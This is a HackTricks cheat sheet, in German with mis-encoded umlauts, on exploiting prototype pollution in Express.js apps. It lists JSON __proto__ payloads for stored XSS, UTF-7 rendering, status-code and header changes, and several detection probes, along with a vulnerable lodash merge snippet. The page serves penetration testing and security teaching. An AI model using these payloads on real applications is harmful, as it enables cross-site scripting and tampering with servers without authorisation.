# Express Prototype Pollution Gadgets

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## XSS-Antworten bereitstellen

**F√ºr weitere Details [schauen Sie sich die urspr√ºngliche Forschung an](https://portswigger.net/research/server-side-prototype-pollution)**

### √Ñndern Sie den JSON-Inhaltstyp in HTML

In einer Express-App, die eine **JSON-Inhaltstyp-Antwort** verwendet und ein JSON reflektiert:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
In diesen F√§llen ist XSS normalerweise nicht m√∂glich mit einem JSON-Inhaltstyp. Mit der Prototyp-Verschmutzung k√∂nnen wir jedoch Express dazu bringen, eine HTML-Antwort zu senden. Diese Schwachstelle beruht darauf, dass die Anwendung **`res.send(obj)`** verwendet und den Body-Parser mit dem Anwendungstyp application/json verwendet.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Durch **Verschmutzung** der Eigenschaften **`body`** und **`_body`** ist es m√∂glich, Express dazu zu bringen, den HTML-Inhaltstyp zu servieren und die Eigenschaft `_body` widerzuspiegeln, was zu gespeichertem XSS f√ºhrt.

### UTF7 rendern

Es ist m√∂glich, Express dazu zu bringen, **UTF-7-Inhalte zu rendern mit**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Sichere Scantechniken

### JSON-Leerzeichen

Die folgende PP f√ºgt Attributen innerhalb eines JSON einen zus√§tzlichen Leerraum hinzu, der die Funktionalit√§t nicht beeintr√§chtigt:
```json
{"__proto__":{"json spaces": " "}}
```
Dann wird ein reflektiertes JSON wie folgt aussehen:
```json
{"foo":  "bar"} -- Note the extra space
```
### Offengelegte Header

Das folgende PP-Gadget bewirkt, dass der Server den HTTP-Header **`Access-Control-Expose_headers: foo`** zur√ºckschickt.
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Es erfordert das **CORS-Modul, um installiert zu sein**

### **OPTIONS-Methode**

Mit dem folgenden Payload ist es m√∂glich, **eine Methode vor einer OPTIONS-Antwort zu verbergen**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

Es ist m√∂glich, den **zur√ºckgegebenen Statuscode** mithilfe des folgenden PP-Payloads zu √§ndern:
```json
{"__proto__":{"status":510}}
```
### Fehler

Wenn Sie einem Prototypen einen primitiven Wert wie einen String zuweisen, wird eine **no-op-Operation ausgef√ºhrt, da der Prototyp ein Objekt sein muss**. Wenn Sie versuchen, einem Prototypenobjekt den `Object.prototype` selbst zuzuweisen, wird dies eine **Ausnahme ausl√∂sen**. Wir k√∂nnen diese beiden Verhaltensweisen verwenden, um festzustellen, ob die Prototypenverunreinigung erfolgreich war:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflektierter Wert

Wenn eine Anwendung ein Objekt in ihrer Antwort enth√§lt und ein Attribut mit einem **ungew√∂hnlichen Namen neben `__proto__`** erstellt, kann dies aufschlussreich sein. Insbesondere wenn nur das ungew√∂hnliche Attribut in der Antwort zur√ºckgegeben wird, k√∂nnte dies auf eine Schwachstelle in der Anwendung hinweisen:
```json
{"unusualName":"value","__proto__":"test"}
```
Dar√ºber hinaus bietet sich in Szenarien, in denen eine Bibliothek wie Lodash verwendet wird, eine weitere diagnostische Methode an, indem eine Eigenschaft sowohl √ºber die Prototype Pollution (PP) als auch direkt im Objekt gesetzt wird. Wenn eine solche Eigenschaft in der Antwort fehlt, deutet dies darauf hin, dass Lodash die Existenz der Eigenschaft im Zielobjekt vor dem Zusammenf√ºhren √ºberpr√ºft:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Sonstiges

### Punkte erlauben

Es gibt eine Option in Express, die es Ihnen erm√∂glicht, **Objekte aus Abfragezeichenfolgenparametern zu erstellen**.\
Sie k√∂nnten es definitiv in einer Fehlerkette verwenden, um eine **Prototyp-Verschmutzungsanf√§lligkeit** auszunutzen.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` erstellt ein Objekt in Node.**

## Referenzen

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
